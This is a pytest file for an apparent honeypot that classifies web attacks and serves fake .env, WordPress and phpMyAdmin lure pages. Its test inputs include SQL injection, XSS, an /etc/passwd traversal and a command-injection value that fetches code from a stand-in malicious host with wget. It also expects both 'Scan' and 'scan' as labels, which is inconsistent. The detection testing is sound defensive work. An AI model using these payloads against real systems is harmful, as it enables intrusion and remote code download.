import pytest
from unittest.mock import patch, AsyncMock
from aiohttp import web
from main import detect_attack_type, make_app

def test_detect_attack_type():
    # Test SQLi
    assert detect_attack_type("GET", "/index.php", "id=1' OR 1=1 --", {}, "") == "SQLi"
    # Test XSS
    assert detect_attack_type("POST", "/comment", "", {}, "<script>alert(1)</script>") == "XSS"
    # Test Path Traversal
    assert detect_attack_type("GET", "/download", "file=../../etc/passwd", {}, "") == "PathTraversal"
    # Test Cmd Injection
    assert detect_attack_type("POST", "/run", "", {}, "ip=127.0.0.1; wget http://malicious.site/mal") == "CmdInjection"
    # Test Cred Stuffing
    assert detect_attack_type("POST", "/login", "", {}, "user=admin&password=123") == "CredStuffing"
    # Test Scan (User-Agent or catch-all)
    assert detect_attack_type("GET", "/index.php", "", {"User-Agent": "sqlmap/1.4.12"}, "") == "Scan"
    # Test catch-all scan
    assert detect_attack_type("GET", "/unknown-path", "", {}, "") == "scan"

import pytest_asyncio

@pytest_asyncio.fixture
async def cli(aiohttp_client):
    app = make_app()
    return await aiohttp_client(app)

@pytest.mark.asyncio
@patch("main.submit_event", new_callable=AsyncMock)
async def test_fake_endpoints(mock_submit, cli):
    # Test .env endpoint
    resp = await cli.get("/.env")
    assert resp.status == 200
    text = await resp.text()
    assert "DB_PASSWORD" in text
    assert mock_submit.called

    # Test wp-login endpoint
    mock_submit.reset_mock()
    resp = await cli.get("/wp-login.php")
    assert resp.status == 200
    html = await resp.text()
    assert "WordPress" in html
    assert mock_submit.called

    # Test phpmyadmin endpoint
    mock_submit.reset_mock()
    resp = await cli.get("/phpmyadmin")
    assert resp.status == 200
    html = await resp.text()
    assert "phpMyAdmin" in html
    assert mock_submit.called

    # Test catch-all endpoint (404)
    mock_submit.reset_mock()
    resp = await cli.get("/non-existent-page")
    assert resp.status == 404
    assert mock_submit.called
